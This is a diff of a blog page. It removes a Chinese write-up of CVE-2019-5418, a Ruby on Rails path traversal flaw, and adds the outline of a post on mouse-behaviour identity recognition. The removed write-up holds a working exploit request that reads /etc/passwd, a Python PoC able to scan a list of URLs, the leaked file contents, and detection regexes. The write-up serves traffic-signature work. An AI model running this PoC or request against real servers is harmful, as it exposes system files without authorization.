@@ -12,7 +12,7 @@
 
 
 
-<title>identification | Gale&#39;s Blog</title>
+<title>基于鼠标行为的身份识别系统（一） | Gale&#39;s Blog</title>
 
 
 
@@ -173,7 +173,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">identification</h1>
+            <h1 class="post-title">基于鼠标行为的身份识别系统（一）</h1>
             
                 <div class="post-meta">
                     
@@ -186,194 +186,21 @@
                         </span>
                     
                     
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/">系统安全</a>
+                            
+                        </span>
+                    
                 </div>
             
         </header>
 
         <div class="post-content">
             <hr>
-<h2 id="title-CVE-2019-5418-Ruby-on-Rails路径穿越与任意文件读取分析文档"><a href="#title-CVE-2019-5418-Ruby-on-Rails路径穿越与任意文件读取分析文档" class="headerlink" title="title: CVE-2019-5418-Ruby on Rails路径穿越与任意文件读取分析文档"></a>title: CVE-2019-5418-Ruby on Rails路径穿越与任意文件读取分析文档</h2><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.  简介"></a>1.  简介</h3><p>　1.1 　目的<br>　1.2 　范围<br>　1.3 　定义、首字母缩写词和缩略语<br>　1.4 　参考资料<br>　1.5 　概述<br>　1.6 　漏洞形成原理</p>
-<h3 id="2-协议简介"><a href="#2-协议简介" class="headerlink" title="2.  协议简介"></a>2.  协议简介</h3><p>　2.1 　协议分析范围<br>　2.2 　定义（术语、名词解释）</p>
-<h3 id="3-协议交互流程"><a href="#3-协议交互流程" class="headerlink" title="3.  协议交互流程"></a>3.  协议交互流程</h3><h3 id="4-数据包格式"><a href="#4-数据包格式" class="headerlink" title="4.  数据包格式"></a>4.  数据包格式</h3><p>　4.1 漏洞复现成功请求响应对<br>　4.2 漏洞利用成功请求响应对  </p>
-<h3 id="5-正则总结"><a href="#5-正则总结" class="headerlink" title="5. 正则总结"></a>5. 正则总结</h3><h3 id="6-漏洞复现"><a href="#6-漏洞复现" class="headerlink" title="6.漏洞复现"></a>6.漏洞复现</h3><h1 id="协议分析文档"><a href="#协议分析文档" class="headerlink" title="协议分析文档"></a>协议分析文档</h1><h2 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.  简介"></a>1.  简介</h2><h3 id="1-1-目的"><a href="#1-1-目的" class="headerlink" title="1.1 目的"></a>1.1 目的</h3><p>分析Ruby on Rails路径穿越与任意文件（CVE-2019-5418）复现后的数据包结构，提取用于识别该协议数据流的正则特征。</p>
-<h3 id="1-2-范围"><a href="#1-2-范围" class="headerlink" title="1.2 范围"></a>1.2 范围</h3><p>略</p>
-<h3 id="1-3-定义、首字母缩写词和缩略语"><a href="#1-3-定义、首字母缩写词和缩略语" class="headerlink" title="1.3 定义、首字母缩写词和缩略语"></a>1.3 定义、首字母缩写词和缩略语</h3><p>略</p>
-<h3 id="1-4-参考资料"><a href="#1-4-参考资料" class="headerlink" title="1.4 参考资料"></a>1.4 参考资料</h3><p>略</p>
-<h3 id="1-5-概述"><a href="#1-5-概述" class="headerlink" title="1.5 概述"></a>1.5 概述</h3><p>Ruby on Rails是一个 Web 应用程序框架,是一个相对较新的 Web 应用程序框架，构建在 Ruby 语言之上。</p>
-<h3 id="1-6-漏洞形成原理"><a href="#1-6-漏洞形成原理" class="headerlink" title="1.6 漏洞形成原理"></a>1.6 漏洞形成原理</h3><h4 id="1-6-1-漏洞描述"><a href="#1-6-1-漏洞描述" class="headerlink" title="1.6.1 漏洞描述"></a>1.6.1 漏洞描述</h4><p>访问<a href="http://your-ip:3000/robots可见，正常的robots.txt文件被读取出来。截取此请求数据包，利用漏洞，发送如下数据包，读取/etc/passwd。" target="_blank" rel="noopener">http://your-ip:3000/robots可见，正常的robots.txt文件被读取出来。截取此请求数据包，利用漏洞，发送如下数据包，读取/etc/passwd。</a></p>
-<pre><code>GET /robots HTTP/1.1
-Host: your-ip:3000
-Accept-Encoding: gzip, deflate
-Accept: ../../../../../../../../etc/passwd{{
-Accept-Language: en
-User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
-Connection: close</code></pre><h4 id="1-6-2-漏洞分析"><a href="#1-6-2-漏洞分析" class="headerlink" title="1.6.2 漏洞分析"></a>1.6.2 漏洞分析</h4><p>由于Ruby on Rails使用了指定参数的render file来渲染应用之外的视图，因此可以通过修改访问某控制器的请求包（通过“../../../../”进行路径穿越，然后通过“&#123;&#123;”来进行模板查询路径的闭合，使得所要访问的文件被当做外部模板来解析）来进行攻击。</p>
-<p>网上现有的poc：</p>
-<pre><code>#CVE-2019-5418Ruby on Rails路径穿越与任意文件
-
-# Usage：python3 CVE-2019-5418.py -u url
-
-# python3 CVE-2019-5418.py -f url.txt
-
-import requests
-import argparse
-import sys
-def rail_poc(url):
-    url = url+&apos;/robots&apos;
-    headers = {
-        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0&quot;,
-        &quot;Accept&quot;: &quot;../../../../../../etc/passwd{{&quot;,
-        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,
-        &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
-        &quot;DNT&quot;: &quot;1&quot;,
-        &quot;Connection&quot;: &quot;close&quot;,
-        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
-    }
-    resp = requests.get(url,headers=headers).text
-    if &quot;nologin&quot; in resp:
-        print(url+&quot;存在任意文件读取漏洞&quot;)
-        print(resp)
-    else:
-        print(&quot;不存在漏洞&quot;)
-
-if __name__ == &apos;__main__&apos;:
-    if len(sys.argv) == 1:
-        print(&apos;python3 CVE-2019-5418.py -u url&apos;)
-        print(&apos;python3 CVE-2019-5418.py -f url.txt&apos;)
-
-    parser = argparse.ArgumentParser(description=&quot;CVE-2019-5418.py -u 指定url -f 指定文本&quot;)
-    parser.add_argument(&apos;-u&apos;, &apos;--url&apos;, default=&apos;&apos;, help=&quot;-u http://xx.xx.xx.xx&quot;)
-    parser.add_argument(&apos;-f&apos;, &apos;--file&apos;, default=&apos;&apos;, help=&quot;-f xxx.txt&quot;)
-    args = parser.parse_args()
-
-    if args.url:
-        rail_poc(args.url)
-    if args.file:
-        with open(args.file,&apos;r&apos;) as f:
-            urls = f.readlines()
-        for url in urls:
-            url = url.strip(&apos;\n&apos;).strip(&apos;\r&apos;)
-            rail_poc(url)</code></pre><h3 id="2-2-定义（术语、名词解释）"><a href="#2-2-定义（术语、名词解释）" class="headerlink" title="2.2 定义（术语、名词解释）"></a>2.2 定义（术语、名词解释）</h3><p>客户端：存在ruby on rails漏洞环境的。</p>
-<h2 id="3-协议交互流程-1"><a href="#3-协议交互流程-1" class="headerlink" title="3. 协议交互流程"></a>3. 协议交互流程</h2><p>在漏洞复现后对漏洞进行攻击时产生的数据流的传输。</p>
-<h2 id="4-数据包格式-1"><a href="#4-数据包格式-1" class="headerlink" title="4. 数据包格式"></a>4. 数据包格式</h2><h3 id="4-1-漏洞复现成功请求响应对"><a href="#4-1-漏洞复现成功请求响应对" class="headerlink" title="4.1 漏洞复现成功请求响应对"></a>4.1 漏洞复现成功请求响应对</h3><p>请求：  </p>
-<pre><code>GET /robots HTTP/1.1
-Accept: text/html, application/xhtml+xml, image/jxr, */*
-Accept-Language: zh-Hans-CN,zh-Hans;q=0.5
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
-Accept-Encoding: gzip, deflate
-If-None-Match: W/&quot;50d0ca4a1d4d4973fe4994ec3bbe8a3e&quot;
-Host: 192.168.133.128:3000
-Connection: close</code></pre><p>响应：  </p>
-<pre><code>HTTP/1.1 200 OK
-X-Frame-Options: SAMEORIGIN
-X-XSS-Protection: 1; mode=block
-X-Content-Type-Options: nosniff
-X-Download-Options: noopen
-X-Permitted-Cross-Domain-Policies: none
-Referrer-Policy: strict-origin-when-cross-origin
-Content-Type: text/html; charset=utf-8
-ETag: W/&quot;3da1aebe96b1d15a4957b1f4c7753b66&quot;
-Cache-Control: max-age=0, private, must-revalidate
-Set-Cookie: _blog_session=BC0TlGa%2FVQVe%2FKZV49zNLfsWpiV%2B10RUbSQ8%2FRsxN6tv5SzBEACDHJKYOEiUCmBBHnnQ483rFFCBIjvjD1NiY0JW9ffMeD%2F6BUUREgIwrHB1GmADT4PvfMEOkYl2T%2FLOzX9pTpa294P%2Ba%2FAG7ng%3D--GKUm7XxNk4y9%2BQYw--ZAV6yL0%2FazCU%2BCpNP4c7yg%3D%3D; path=/; HttpOnly
-X-Request-Id: 9874d7d3-483b-4d81-b908-a4da2e4306fa
-X-Runtime: 0.184354
-Connection: close
-Transfer-Encoding: chunked
-
-71c
-&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-&lt;title&gt;Blog&lt;/title&gt;
-&lt;meta name=&quot;csrf-param&quot; content=&quot;authenticity_token&quot; /&gt;
-&lt;meta name=&quot;csrf-token&quot; content=&quot;+OSIY8DIcD7rQmax1/o3naUjtuaaTw1l0gpcSC/YauTxyDL3SHf1ALQzsASBOzSfdV+/x9KWc+IAxwVX1A21Jw==&quot; /&gt;
-
-&lt;link rel=&quot;stylesheet&quot; media=&quot;all&quot; href=&quot;/assets/vulhub.self-e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css?body=1&quot; data-turbolinks-track=&quot;reload&quot; /&gt;
-&lt;link rel=&quot;stylesheet&quot; media=&quot;all&quot; href=&quot;/assets/application.self-f0d704deea029cf000697e2c0181ec173a1b474645466ed843eb5ee7bb215794.css?body=1&quot; data-turbolinks-track=&quot;reload&quot; /&gt;
-&lt;script src=&quot;/assets/rails-ujs.self-d109d8c5c0194c8ad60b8838b2661c5596b5c955987f7cd4045eb2fb90ca5343.js?body=1&quot; data-turbolinks-track=&quot;reload&quot;&gt;&lt;/script&gt;
-&lt;script src=&quot;/assets/activestorage.self-1ed4604ac2170045f1ffca4edb81a75246661555e4f9cf682bb8a21825e32e1c.js?body=1&quot; data-turbolinks-track=&quot;reload&quot;&gt;&lt;/script&gt;
-&lt;script src=&quot;/assets/turbolinks.self-569ee74eaa15c1e2019317ff770b8769b1ec033a0f572a485f64c82ddc8f989e.js?body=1&quot; data-turbolinks-track=&quot;reload&quot;&gt;&lt;/script&gt;
-&lt;script src=&quot;/assets/action_cable.self-69fddfcddf4fdef9828648f9330d6ce108b93b82b0b8d3affffc59a114853451.js?body=1&quot; data-turbolinks-track=&quot;reload&quot;&gt;&lt;/script&gt;
-&lt;script src=&quot;/assets/cable.self-8484513823f404ed0c0f039f75243bfdede7af7919dda65f2e66391252443ce9.js?body=1&quot; data-turbolinks-track=&quot;reload&quot;&gt;&lt;/script&gt;
-&lt;script src=&quot;/assets/vulhub.self-877aef30ae1b040ab8a3aba4e3e309a11d7f2612f44dde450b5c157aa5f95c05.js?body=1&quot; data-turbolinks-track=&quot;reload&quot;&gt;&lt;/script&gt;
-&lt;script src=&quot;/assets/application.self-66347cf0a4cb1f26f76868b4697a9eee457c8c3a6da80c6fdd76ff77e911715e.js?body=1&quot; data-turbolinks-track=&quot;reload&quot;&gt;&lt;/script&gt;
-&lt;/head&gt;
-
-&lt;body&gt;
-# See http://www.robotstxt.org/robotstxt.html for documentation on how to use the robots.txt file
-
-&lt;/body&gt;
-&lt;/html&gt;
-
-0</code></pre><h3 id="4-2-漏洞利用成功请求响应对"><a href="#4-2-漏洞利用成功请求响应对" class="headerlink" title="4.2 漏洞利用成功请求响应对"></a>4.2 漏洞利用成功请求响应对</h3><p>请求：  </p>
-<pre><code>GET /robots HTTP/1.1
-Accept: ../../../../../../../../etc/passwd{{
-Accept-Language: zh-Hans-CN,zh-Hans;q=0.5
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
-Accept-Encoding: gzip, deflate
-If-None-Match: W/&quot;3da1aebe96b1d15a4957b1f4c7753b66&quot;
-Host: 192.168.133.128:3000
-Cookie: _blog_session=BC0TlGa%2FVQVe%2FKZV49zNLfsWpiV%2B10RUbSQ8%2FRsxN6tv5SzBEACDHJKYOEiUCmBBHnnQ483rFFCBIjvjD1NiY0JW9ffMeD%2F6BUUREgIwrHB1GmADT4PvfMEOkYl2T%2FLOzX9pTpa294P%2Ba%2FAG7ng%3D--GKUm7XxNk4y9%2BQYw--ZAV6yL0%2FazCU%2BCpNP4c7yg%3D%3D
-Connection: close</code></pre><p>响应：  </p>
-<pre><code>HTTP/1.1 200 OK
-X-Frame-Options: SAMEORIGIN
-X-XSS-Protection: 1; mode=block
-X-Content-Type-Options: nosniff
-X-Download-Options: noopen
-X-Permitted-Cross-Domain-Policies: none
-Referrer-Policy: strict-origin-when-cross-origin
-Content-Type: text/html; charset=utf-8
-ETag: W/&quot;f3df8ec25c77cb0e445aab589c5fef4d&quot;
-Cache-Control: max-age=0, private, must-revalidate
-Set-Cookie: _blog_session=c8V1y1kIYLBINfTN%2FjTuuMJDlDqaBDqrAWcv0Y0fjArsBU7rt8JRzCTVoO%2FbHHW9CwspafWuTq8X0QvipNZxfavvCzKTnrm36pafwyTJBG0UNEMoeIsAqXCbShWOZ2cJrvLFdKAAUCoXQP34V%2F4%3D--4JqsbQ%2FrLaaTg6sr--X0TedQFoYMjKnbCHBX05vw%3D%3D; path=/; HttpOnly
-X-Request-Id: 6e7fdad2-cc73-4be5-af96-09d0a5d8c70f
-X-Runtime: 0.002565
-Connection: close
-Transfer-Encoding: chunked
-
-397
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/bin/false
-
-0</code></pre><h2 id="5-正则总结-1"><a href="#5-正则总结-1" class="headerlink" title="5.正则总结"></a>5.正则总结</h2><p>综上请求响应对，可以提出以下几个用于描述Ruby on Rails数据流的正则：</p>
-<ol>
-<li><p><strong>请求特征</strong>：  </p>
-<p> <code>r&quot;^GET /robots[\s\S]*?Accept[\s\S]*?Accept-Language[\s\S]*?Host[\s\S]*?Connection: close&quot;</code>  </p>
-</li>
-<li><p><strong>响应特征</strong>：<br> <code>r&quot;HTTP/1.1[\s\S]*?X-Frame-Options[\s\S]*?Transfer-Encoding: chunked&quot;</code>      </p>
-</li>
-</ol>
-<ol start="3">
-<li><p><strong>漏洞利用成功（success）特征</strong>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;regex&#39;: [		</span><br><span class="line">        re.compile(r&quot;root[\s\S]*?&#x2F;usr&#x2F;sbin&#x2F;nologin[\s\S]*?_apt&quot;)</span><br><span class="line">    ],</span><br><span class="line">    &#39;min_shot_num&#39;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>请求体中判断vulnerable特征</strong>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;regex&#39;: [</span><br><span class="line">        re.compile(r&quot;HTTP&#x2F;1.1[\s\S]*?Accept[\s\S]*?Connection&quot;, re.I)</span><br><span class="line">     ],</span><br><span class="line">     &#39;min_shot_num&#39;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-</li>
-</ol>
-<p>##6.漏洞复现<br>构造存在漏洞的Ruby on Rails环境</p>
-<p>访问<a href="http://ip:3000，即可看到Ruby">http://ip:3000，即可看到Ruby</a> on Rails的访问成功页面。<br><img src="/2020/05/30/identification/ruby.png" alt="ruby"></p>
-<p>使用现网存在的构造poc的py文件进行复现</p>
-<pre><code>python rubyonrails_poc.py -u http://192.168.137.128:3000/</code></pre><p>复现成功界面：<br><img src="/2020/05/30/identification/poc.png" alt="poc_run"></p>
+<h2 id="title-基于鼠标行为的身份识别系统（一）"><a href="#title-基于鼠标行为的身份识别系统（一）" class="headerlink" title="title: 基于鼠标行为的身份识别系统（一）"></a>title: 基于鼠标行为的身份识别系统（一）</h2><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h3 id="1-鼠标行为监测与特征提取"><a href="#1-鼠标行为监测与特征提取" class="headerlink" title="1.  鼠标行为监测与特征提取"></a>1.  鼠标行为监测与特征提取</h3><p>　1.1 　鼠标行为监测<br>　1.2 　特征提取</p>
+<h3 id="2-识别算法"><a href="#2-识别算法" class="headerlink" title="2.  识别算法"></a>2.  识别算法</h3><p>　2.1 　SVM算法</p>
 
         </div>
 
@@ -401,6 +228,14 @@ _apt:x:100:65534::/nonexistent:/bin/false
                 <span>Tag(s):</span>
                 <span class="tag">
                     
+                    
+                        <a href="/tags/python/"># python</a>
+                    
+                        <a href="/tags/C%E8%AF%AD%E8%A8%80/"># C语言</a>
+                    
+                        <a href="/tags/svm/"># svm</a>
+                    
+                        
                 </span>
             </div>
             <div>
